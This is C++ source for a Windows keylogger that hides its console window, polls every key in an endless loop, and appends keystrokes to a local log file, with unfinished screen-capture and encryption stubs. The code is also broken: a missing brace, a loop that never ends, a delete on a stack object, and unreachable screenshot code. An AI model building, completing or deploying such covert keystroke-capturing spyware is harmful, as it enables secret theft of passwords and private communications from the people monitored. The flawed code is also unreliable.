// Keylogger.cpp : Defines the entry point for the console application.
#include <stdio.h>
#include "stdafx.h"
#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
#include <gdiplus.h>
#include <time.h>

using namespace std;

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
		using namespace Gdiplus;
		UINT  num = 0;
		UINT  size = 0;

		ImageCodecInfo* pImageCodecInfo = NULL;

		GetImageEncodersSize(&num, &size);
		if (size == 0)
			return -1;

		pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
		if (pImageCodecInfo == NULL)
			return -1;

		GetImageEncoders(num, size, pImageCodecInfo);
		for (UINT j = 0; j < num; ++j)
		{
			if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
			{
				*pClsid = pImageCodecInfo[j].Clsid;
				free(pImageCodecInfo);
				return j;
			}
		}
		free(pImageCodecInfo);
		return 0;
	}

void gdiscreen() {
	using namespace Gdiplus;
	IStream* istream;
	HRESULT res = CreateStreamOnHGlobal(NULL, true, &istream);
	GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
	{
		HDC scrdc, memdc;
		HBITMAP membit;
		scrdc = ::GetDC(0);
		int Height = GetSystemMetrics(SM_CYSCREEN);
		int Width = GetSystemMetrics(SM_CXSCREEN);
		memdc = CreateCompatibleDC(scrdc);
		membit = CreateCompatibleBitmap(scrdc, Width, Height);
		HBITMAP hOldBitmap = (HBITMAP)SelectObject(memdc, membit);
		BitBlt(memdc, 0, 0, Width, Height, scrdc, 0, 0, SRCCOPY);

		Gdiplus::Bitmap bitmap(membit, NULL);
		CLSID clsid;
		GetEncoderClsid(L"image/jpeg", &clsid);
		//		bitmap.Save(L"screen.jpeg", &clsid, NULL); // To save the jpeg to a file
		bitmap.Save(istream, &clsid, NULL);

		// Create a bitmap from the stream and save it to make sure the stream has the image
		//		Gdiplus::Bitmap bmp(istream, NULL);
		//		bmp.Save(L"t1est.jpeg", &clsid, NULL);             
		// END

		delete &clsid;
		DeleteObject(memdc);
		DeleteObject(membit);
		::ReleaseDC(0, scrdc);
	}
	GdiplusShutdown(gdiplusToken);
}

void WriteData(string Text) {
	ofstream LogFile;
	LogFile.open("Keylogs.txt", fstream::app);
	LogFile << Text;
	LogFile.close();
}

void Stealth() {
	HWND hWnd;
	AllocConsole();
	hWnd = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hWnd, 0);
}

void Encrypt() {}

void PrintScreen() {
	keybd_event(VK_MENU, 0, 0, 0); //Alt Press
	keybd_event(VK_SNAPSHOT, 0, 0, 0); //PrntScrn Press


	keybd_event(VK_SNAPSHOT, 0, KEYEVENTF_KEYUP, 0); //PrntScrn Release
	keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0); //Alt Release
}

bool isKeyListed(int vKey) {
	
	switch (vKey) {
		case VK_RETURN:
			WriteData("\n [ ENTER_PRESSED ]");
			break;
		case VK_BACK:
			WriteData("\b [ BACKSPACE ]");
			break;
		case VK_SPACE:
			WriteData(" [ space ]");
			break;
		case VK_SHIFT:
			WriteData(" shift ");
			break;
		case VK_OEM_PERIOD:
			WriteData(".");
			break;
		default: { return false; }
	
}


int main () {

	Stealth();

	char Key;

	while (1) {
		for (Key = 8; Key <= 255; Key++) {
			if (GetKeyState(Key) == -32767) {
				if (isKeyListed(Key) == TRUE) {
					ofstream LogFile;
					LogFile.open("Keylogs.txt", fstream::app);
					LogFile << Key;
					LogFile.close();
				}
			}
		}
	}
	clock_t t1 = clock();
	int i;
	int iterations = 10;

	for (i = 0;i<iterations;i++) {
		gdiscreen();
	}

	clock_t t2 = clock();
	printf("%d iterations: %0.0f fps\n", iterations, iterations / ((double)(t2 - t1) / CLOCKS_PER_SEC));

	return 0;

}
